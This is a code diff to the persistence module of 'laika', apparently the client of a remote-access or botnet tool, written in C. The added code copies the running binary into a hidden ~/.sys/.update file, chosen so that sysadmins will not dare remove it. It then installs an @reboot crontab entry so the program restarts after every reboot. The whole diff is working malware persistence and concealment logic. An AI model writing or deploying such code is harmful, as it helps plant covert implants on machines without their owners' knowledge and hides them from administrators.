@@ -2,13 +2,21 @@
 
 /* this is only used to check if another instance of laika is currently running */
 #define LAIKA_RESERVED_PORT 32876
+#define LAIKA_TMP_FILE "/tmp/laikaTMP"
+
+/* most sysadmins probably wouldn't dare remove something named '.sys/.update' */
+#define LAIKA_INSTALL_DIR_USER ".sys"
+#define LAIKA_INSTALL_FILE_USER ".update"
 
 #include "persist.h"
 #include "lsocket.h"
 #include "lerror.h"
+#include "lmem.h"
 
 #include <unistd.h>
 #include <sys/types.h>
+#include <sys/stat.h>
+#include <pwd.h>
 
 static struct sLaika_socket laikaB_markerPort;
 
@@ -51,31 +59,62 @@ void getCurrentExe(char *outPath, int pathSz) {
     int sz;
 
     /* thanks linux :D */
-    if ((sz = readlink("/proc/self/exe", outPath, pathSz - 1)) != 0)
+    if ((sz = readlink("/proc/self/exe", outPath, pathSz - 1)) == -1)
         LAIKA_ERROR("Failed to grab current process executable path!\n");
 
     outPath[sz] = '\0';
 }
 
-void tryPersistUser(char *path) {
+void getInstallPath(char *outPath, int pathSz) {
+    struct stat st;
+    const char *home;
 
+    /* try to read home from ENV, else get it from pw */
+    if ((home = getenv("HOME")) == NULL) {
+        home = getpwuid(getuid())->pw_dir;
+    }
+
+    /* create install directory if it doesn't exist */
+    snprintf(outPath, pathSz, "%s/%s", home, LAIKA_INSTALL_DIR_USER);
+    LAIKA_DEBUG("creating '%s'...\n", outPath);
+    if (stat(outPath, &st) == -1)
+        mkdir(outPath, 0700);
+
+    snprintf(outPath, pathSz, "%s/%s/%s", home, LAIKA_INSTALL_DIR_USER, LAIKA_INSTALL_FILE_USER);
 }
 
-void tryPersistRoot(char *path) {
+void tryPersistCron(char *path) {
+    char cmd[PATH_MAX + 128];
 
+    /* should be 'safe enough' */
+    snprintf(cmd, PATH_MAX + 128, "(crontab -l ; echo \"@reboot %s\")| crontab -", path);
+
+    /* add laika to crontab */
+    if (system(cmd))
+        LAIKA_ERROR("failed to install '%s' to crontab!\n", path);
+
+    LAIKA_DEBUG("Installed '%s' to crontab!\n", path);
 }
 
 /* try to gain persistance on machine */
 void laikaB_tryPersist() {
+#ifndef LAIKA_NOINSTALL
     char exePath[PATH_MAX];
+    char installPath[PATH_MAX];
 
-    /* grab current process's executable & try to gain persistance */
+    /* grab current process's executable & get the install path */
     getCurrentExe(exePath, PATH_MAX);
-    if (laikaB_checkRoot()) {
-        tryPersistRoot(exePath);
-    } else {
-        tryPersistUser(exePath);
-    }
+    getInstallPath(installPath, PATH_MAX);
+
+    /* move exe to install path */
+    if (rename(exePath, installPath))
+        LAIKA_ERROR("Failed to install '%s' to '%s'!\n", exePath, installPath);
+
+    LAIKA_DEBUG("Successfully installed '%s'!\n", installPath);
+
+    /* enable persistence on reboot via cron */
+    tryPersistCron(installPath);
+#endif
 }
 
 /* try to gain root */
